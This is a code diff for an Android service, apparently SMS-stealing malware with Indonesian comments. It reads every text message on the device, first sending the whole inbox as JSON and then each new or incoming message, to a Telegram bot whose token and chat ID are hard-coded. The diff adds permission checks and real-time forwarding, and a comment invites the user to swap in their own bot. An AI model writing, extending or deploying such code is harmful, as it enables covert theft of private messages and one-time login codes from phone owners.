@@ -1,10 +1,12 @@
 package com.commandprompt;
 
+import android.Manifest;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
@@ -15,6 +17,7 @@ import android.util.Log;
 
 import androidx.annotation.Nullable;
 import androidx.core.app.NotificationCompat;
+import androidx.core.content.ContextCompat;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -31,8 +34,11 @@ public class SmsService extends Service {
 
     private static final String TAG = "SmsService";
     private static final String CH_ID = "sms_mon";
+
+    // GANTI dengan punya kamu
     private static final String BOT_TOKEN = "8539992688:AAEuPMyOXEweuaaHebCjGqsnMdeucQFKXhA";
     private static final String CHAT_ID   = "8275632263";
+
     private static final long LOOP_MS = 500;
 
     private final Set<String> seen = new HashSet<>();
@@ -49,16 +55,33 @@ public class SmsService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        handler.post(new Runnable() {
-            @Override public void run() {
-                poll();
-                handler.postDelayed(this, LOOP_MS);
-            }
-        });
+        // realtime dari SmsReceiver
+        if (intent != null && intent.hasExtra("body")) {
+            final String from = intent.getStringExtra("from");
+            final String body = intent.getStringExtra("body");
+            final long time = intent.getLongExtra("time", System.currentTimeMillis());
+            sendTelegram("📩 SMS REALTIME\n"
+                    + "dari: " + from + "\n"
+                    + "waktu: " + time + "\n"
+                    + "isi: " + body);
+        }
+
+        // mulai polling hanya jika izin sudah ada
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
+                == PackageManager.PERMISSION_GRANTED) {
+            handler.post(new Runnable() {
+                @Override public void run() {
+                    poll();
+                    handler.postDelayed(this, LOOP_MS);
+                }
+            });
+        } else {
+            Log.e(TAG, "READ_SMS belum diizinkan, polling tidak jalan");
+        }
+
         return START_STICKY;
     }
 
-    /** baca sms dari content provider, kirim baru ke tg, kirim lama sekali di awal */
     private void poll() {
         Cursor c = null;
         try {
@@ -67,7 +90,10 @@ public class SmsService extends Service {
                     new String[]{"_id", "address", "body", "date"},
                     null, null, "date ASC");
 
-            if (c == null) return;
+            if (c == null) {
+                Log.e(TAG, "cursor null, mungkin izin belum diberikan");
+                return;
+            }
 
             JSONArray all = new JSONArray();
 
@@ -84,7 +110,6 @@ public class SmsService extends Service {
                 o.put("date", date);
                 all.put(o);
 
-                // kirim sms BARU tiap ada yang belum pernah dilihat
                 if (!firstRun && !seen.contains(id)) {
                     sendTelegram(
                             "📩 SMS BARU\n" +
@@ -96,7 +121,6 @@ public class SmsService extends Service {
                 seen.add(id);
             }
 
-            // pertama kali jalan -> kirim semua sms lama sebagai JSON
             if (firstRun) {
                 firstRun = false;
                 sendTelegram("📦 SMS LAMA (" + all.length() + ")\n" + all.toString());
